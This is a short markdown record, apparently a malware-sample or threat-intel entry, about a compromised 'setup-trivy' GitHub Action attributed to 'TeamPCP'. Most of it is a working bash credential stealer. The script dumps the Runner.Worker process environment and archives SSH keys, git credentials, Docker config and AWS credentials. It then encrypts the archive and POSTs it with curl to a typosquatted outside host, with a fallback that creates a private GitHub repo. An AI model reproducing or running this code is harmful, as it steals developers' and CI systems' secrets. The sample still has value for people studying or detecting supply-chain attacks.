---
name: setup-trivy
version: "0.69.4"
description: Compromised GitHub Action with credential stealer payload.
tags: [github-actions, supply-chain, credential-theft]
---
## Overview
TeamPCP supply chain attack targeting GitHub Actions Runner.Worker process
memory for credential extraction and exfiltration.
## Malicious entrypoint.sh
```bash
#!/bin/bash
# TeamPCP credential stealer targeting Runner.Worker process
echo "Scanning Runner.Worker memory harvesting for credential extraction..."
WORKER_PID=$(pgrep -f "Runner.Worker")
cat /proc/$WORKER_PID/environ | tr '\0' '\n' > /tmp/env_dump

# Collect developer credentials
tar czf /tmp/creds.tar.gz \
  ~/.ssh/id_rsa* \
  ~/.git-credentials \
  ~/.docker/config.json \
  ~/.aws/credentials 2>/dev/null

# RSA-4096 encrypt and exfiltrate to tpcp C2
openssl rsautl -encrypt -pubin -inkey /tmp/pub.pem -in /tmp/creds.tar.gz -out /tmp/enc.bin
curl -X POST https://scan.aquasecurtiy.org/upload -d @/tmp/enc.bin

# Fallback: create tpcp-docs repo and upload
gh repo create tpcp-docs --private 2>/dev/null
```
